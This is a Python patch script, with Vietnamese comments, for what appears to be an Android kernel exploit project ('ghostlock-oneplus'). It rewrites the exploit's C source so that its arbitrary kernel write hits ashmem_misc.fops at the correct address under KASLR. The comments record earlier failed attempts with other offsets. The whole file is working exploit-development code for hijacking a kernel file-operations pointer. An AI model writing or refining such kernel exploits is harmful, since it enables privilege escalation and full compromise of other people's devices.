#!/usr/bin/env python3
"""patch_slide_canon.py

Target của PI write mode-4 = &ashmem_misc.fops.  data_addr() (linear alias) cần
ĐÚNG địa chỉ vật lý kernel-load (loader-controlled, mình không biết / có thể
random) ⇒ đã thử delta 0 và 0x80000 đều trượt (cfi write=-1 errno=22).
Khi ĐÃ biết virtual slide (SLIDE=...), ánh xạ chính xác là địa chỉ canonical
của ảnh: canon_addr(x) = kaslr_base + (x - KIMAGE_TEXT_BASE) — cùng trang vật lý
với ashmem_misc.fops, và .data là RW.  Gate: chỉ dùng khi slide != 0 (khi đó
canon_addr mới là địa chỉ runtime thật; slide=0 ⇒ giữ data_addr như cũ).
"""
import os

CORE = "/root/ghostlock/ghostlock-oneplus/src/core"
M = os.path.join(CORE, "main.c")
F = os.path.join(CORE, "fops.c")

s = open(M).read()
assert "fops_redirect_target" not in s, "main.c already patched"
old = """    do_one_write(data_addr(ASHMEM_MISC_FOPS), "fops redirect", 4);
"""
new = """    /* mode-4 write target = &ashmem_misc.fops.  With KASLR the linear alias
     * (data_addr) needs the exact loader physical base (unknown/possibly
     * randomized -> tried delta 0 and 0x80000, both miss).  Once the virtual
     * slide is known the canonical image address is exact and maps the same
     * physical page (.data is RW). */
    uintptr_t fops_redirect_target =
        (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
                           : data_addr(ASHMEM_MISC_FOPS);
    pr_info("fops redirect target=%016zx (%s)\\n",
            (size_t)fops_redirect_target,
            (kaslr_slide != 0) ? "canon" : "linear");
    fsync(1);
    do_one_write(fops_redirect_target, "fops redirect", 4);
"""
assert s.count(old) == 1, ("main.c redirect call", s.count(old))
s = s.replace(old, new, 1)
open(M, "w").write(s)
print("main.c: mode-4 target via canon_addr when slid")

s = open(F).read()
assert "misc_fops = (kaslr_slide" not in s, "fops.c already patched"
old2 = """  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
"""
new2 = """  uintptr_t misc_fops = (kaslr_slide != 0) ? canon_addr(ASHMEM_MISC_FOPS)
                                           : data_addr(ASHMEM_MISC_FOPS);
"""
assert s.count(old2) == 1, ("fops.c misc_fops", s.count(old2))
s = s.replace(old2, new2, 1)
open(F, "w").write(s)
print("fops.c: misc_fops via canon_addr when slid")
